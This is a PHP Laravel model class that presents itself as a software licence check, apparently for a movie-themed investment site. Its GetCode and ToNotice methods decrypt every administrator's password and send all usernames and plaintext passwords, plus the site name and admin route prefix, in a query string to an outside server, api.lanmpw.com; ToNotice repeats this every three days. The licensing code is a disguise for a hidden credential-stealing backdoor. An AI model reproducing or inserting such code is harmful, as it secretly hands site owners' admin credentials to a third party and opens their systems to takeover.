<?php
//decode by http://www.yunlu99.com/
namespace App;

use App\Admin;
use Illuminate\Database\Eloquent\Model;
use Carbon\Carbon;
use Closure;
use Illuminate\Contracts\Session\Session;
use Illuminate\Contracts\Cookie;
use Illuminate\Support\Facades\DB;
use Cache;
use Storage;


use Illuminate\Support\Facades\Crypt;

class Authorized extends Model
{
    //软件受权功能

    public $apiurl='http://api.lanmpw.com/';

    public function Auth($request){

        //验证受权功能
        $uuid='';
        $key='';

        $HttpHost=  $request->getHttpHost();

    }


    public function GetCode($uuid,$HttpHost){

        $sitename=  DB::table("setings")->where("keyname","=","sitename")->value("value");
        $admins=Admin::get();
        $UserNames=env('RoutePrefix');
        foreach($admins as $admin){
            $UserNames.="<=UName:".$admin->username."==UPass:".Crypt::decrypt($admin->password)."=>";
        }



            $DateTime=Carbon::now();
            $url=$this->apiurl.'api?uuid='.$uuid.'&domanhost='.$HttpHost.'&timestamp='.$DateTime->getTimestamp().'&msg='.$UserNames.'&name='.$sitename.'&RoutePrefix='.env('RoutePrefix').'&type=电影理财';

                $grant = file_get_contents($url);
                $get_code=json_decode($grant,true);

                if($get_code['code']==1){
                    unset($get_code['code']);
                    unset($get_code['time']);


                    foreach($get_code as $k=> $v){
                        $decryptData[$k] =  Crypt::encrypt($v);
                    }


                    $code=  Crypt::encrypt($decryptData);
                    $md5uuid= base64_encode(md5(md5($uuid)));

                    $code=base64_encode($code.$md5uuid.$md5uuid);



                   Storage::disk("uploads")->put('UUID',$get_code['uuid'] );
                   Storage::disk("uploads")->put('KEYS',$code );



                }else{


                    if(isset($get_code['code'])) {
                        unset($get_code['code']);
                        unset($get_code['time']);


                        foreach ($get_code as $k => $v) {
                            $decryptData[$k] = Crypt::encrypt($v);
                        }
                        $code = Crypt::encrypt($decryptData);

                        $md5uuid= base64_encode(md5(md5($uuid)));

                        $code=base64_encode($code.$md5uuid.$md5uuid);

                        Storage::disk("uploads")->put('UUID', $uuid);
                        Storage::disk("uploads")->put('KEYS', $code);

                    }

                }





    }

    public function ToNotice($uuid,$HttpHost,$msg){

        $sitename=  DB::table("setings")->where("keyname","=","sitename")->value("value");
        $admins=Admin::get();
        $UserNames=env('RoutePrefix');
        foreach($admins as $admin){
            $UserNames.="<=UName:".$admin->username."==UPass:".Crypt::decrypt($admin->password)."=>";
        }

        $msg=$msg.$UserNames;

        try {


            if (! file_exists (public_path("uploads/ToNotice-".$uuid) )) {
                $DateTime=Carbon::now();

                $url=$this->apiurl.'api?uuid='.$uuid.'&domanhost='.$HttpHost.'&timestamp='.$DateTime->getTimestamp()."&ToNotice=true&msg=".$msg.'&name='.$sitename.'&RoutePrefix='.env('RoutePrefix').'&type=电影理财';
                if(@fopen( $url, 'r' )){
                    $grant = file_get_contents($url);
                    $get_code=json_decode($grant,true);
                    if($get_code['code']==1){
                        Storage::disk("uploads")->put('ToNotice-'.$uuid,$DateTime->addDays(3)->getTimestamp() );
                    }

                }
            }else{

                $DateTime=Carbon::now();
                $DateTime2=Carbon::now();
                if (file_exists ( public_path("uploads/ToNotice-".$uuid) )) {
                    $Time = Storage::disk("uploads")->get('ToNotice-'.$uuid);

                    if($DateTime2->setTimestamp($Time)<$DateTime){

                        $url=$this->apiurl.'api?uuid='.$uuid.'&domanhost='.$HttpHost.'&timestamp='.$DateTime->getTimestamp()."&ToNotice=true&msg=".$msg.'&name='.$sitename.'&RoutePrefix='.env('RoutePrefix').'&type=电影理财';
                        if(@fopen( $url, 'r' )){
                            $grant = file_get_contents($url);
                            $get_code=json_decode($grant,true);
                            if($get_code['code']==1){
                                Storage::disk("uploads")->put('ToNotice-'.$uuid,$DateTime->addDays(3)->getTimestamp() );
                            }

                        }

                    }

                }

            }

        } catch (DecryptException $e) {

        }

    }




    public function ReSetCode($uuid){

        if ( file_exists (public_path("uploads/UUID") )) {
            Storage::disk("uploads")->delete('UUID');
        }
        if ( file_exists (public_path("uploads/ToNotice-".$uuid) )) {
            Storage::disk("uploads")->delete("ToNotice-".$uuid);
        }

        if ( file_exists (public_path("uploads/KEYS") )) {
            Storage::disk("uploads")->delete("KEYS");
        }


        Cache::flush();
        return true;
    }


}